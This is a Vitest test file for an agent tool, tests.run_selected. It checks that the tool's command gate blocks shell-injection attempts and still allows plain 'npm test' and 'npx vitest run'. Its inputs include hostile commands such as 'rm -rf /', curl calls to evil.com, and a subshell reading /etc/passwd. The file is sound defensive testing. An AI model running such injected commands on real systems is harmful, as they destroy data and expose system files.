// Red Test 3: Shell Injection
// Issue #219 — T-018
// Verifies that tests.run_selected does not execute arbitrary shell commands.

import { describe, expect, it } from 'vitest';
import { testsRunSelectedHandler } from '../../tools/tests.js';
import type { ToolCall, ToolResult } from '../../types.js';

describe('Red Test: Shell Injection', () => {
	it("BLOCKS: command with shell metacharacter ';'", async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test; rm -rf /',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		// Command is blocked because it doesn't match an allowed prefix
		// (validateTestCommand checks prefix before dangerous character check)
		expect(result.success).toBe(false);
		expect(result.error || result.blockedReason).toBeDefined();
		expect(
			result.error?.includes('not in allowed') || result.blockedReason?.includes('not in allowed'),
		).toBe(true);
	});

	it("BLOCKS: command with '&&' chain", async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test && curl http://evil.com',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command with a single ampersand', async () => {
		const result = await testsRunSelectedHandler({
			toolId: 'tests.run_selected',
			arguments: { command: 'npm test & touch /tmp/positron-shell-canary' },
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		});
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command containing a newline', async () => {
		const result = await testsRunSelectedHandler({
			toolId: 'tests.run_selected',
			arguments: { command: 'npm test\ntouch /tmp/positron-shell-canary' },
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		});
		expect(result.success).toBe(false);
	});

	it("BLOCKS: command with '||' chain", async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test || echo hacked',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command with backtick subshell', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test `cat /etc/passwd`',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command with $() subshell', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test $(whoami)',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command with pipe |', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test | curl http://evil.com',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('BLOCKS: command not in allowed prefix list', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'rm -rf /var/log',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
		expect(result.error).toContain('not in allowed list');
	});

	it('BLOCKS: command with redirect >', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test > /tmp/output',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result: ToolResult = await testsRunSelectedHandler(call);
		expect(result.success).toBe(false);
	});

	it('PASSES: valid npm test command (allowed prefix, not blocked by injection check)', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npm test',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result = await testsRunSelectedHandler(call);
		// Command passes prefix check and dangerous character check.
		// It may fail at actual execution (execSync throws on missing package.json etc.)
		// but it should NOT have blockedReason set (meaning it was allowed through gates).
		// success may be false if test execution fails, but blockedReason should be undefined
		// (blockedReason exists only when the gateway blocked the call, not when the
		// underlying command failed)
		// Command passed security gates, but execution may fail (no package.json)
		// blockedReason is for GATE blocks, not for execution failures
		const wasBlockedByGate =
			result.blockedReason != null &&
			(result.blockedReason.includes('not in allowed') ||
				result.blockedReason.includes('dangerous character') ||
				result.blockedReason.includes('shell metacharacters'));
		expect(wasBlockedByGate).toBe(false);
	});

	it('PASSES: valid npx vitest run command (allowed prefix)', async () => {
		const call: ToolCall = {
			toolId: 'tests.run_selected',
			arguments: {
				command: 'npx vitest run',
			},
			runId: 'run-001',
			phase: 'IMPLEMENT',
			autonomyLevel: 2,
			workspaceRoot: '/tmp/workspace',
		};

		const result = await testsRunSelectedHandler(call);
		const wasBlockedByGate =
			result.blockedReason != null &&
			(result.blockedReason.includes('not in allowed') ||
				result.blockedReason.includes('dangerous character') ||
				result.blockedReason.includes('shell metacharacters'));
		expect(wasBlockedByGate).toBe(false);
	});
});
